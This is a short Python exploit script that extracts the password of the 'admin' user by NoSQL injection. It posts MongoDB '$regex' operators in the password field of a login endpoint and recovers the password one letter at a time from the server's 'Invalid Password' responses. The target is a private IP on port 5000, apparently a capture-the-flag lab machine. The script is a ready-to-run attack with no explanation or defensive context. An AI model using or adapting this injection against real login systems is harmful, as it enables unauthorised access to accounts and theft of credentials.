import requests
import json
import string
import sys

def login(url, endpoint, password, pw):

    payload = '{ "$regex": "%s%s" }' % (password,pw)

    data = {
        "user":"admin",
        "password": json.loads(payload),
    }

    r = requests.post(url + endpoint, json=data)
    #print(r.status_code)

    if "Invalid Password" in r.text:
        return False
    else:
        return True

def brute(url, endpoint):
    password = '^'
    pw = '$'
    stop = False

    while stop == False:
        for i in string.ascii_letters:
            sys.stdout.write(f"\r{password}{i}")
            if login(url, endpoint, password, i):
                password += i
                if login(url, endpoint, password, pw):
                    sys.stdout.write(f"\r[INFO] Password: {password}{pw}\r\n")
                    sys.stdout.flush()
                    stop = True
                    break
                break              

if __name__ == '__main__':
    url = "http://10.10.11.139:5000"
    endpoint = "/login"

    #login(url, endpoint, pw)
    brute(url, endpoint)

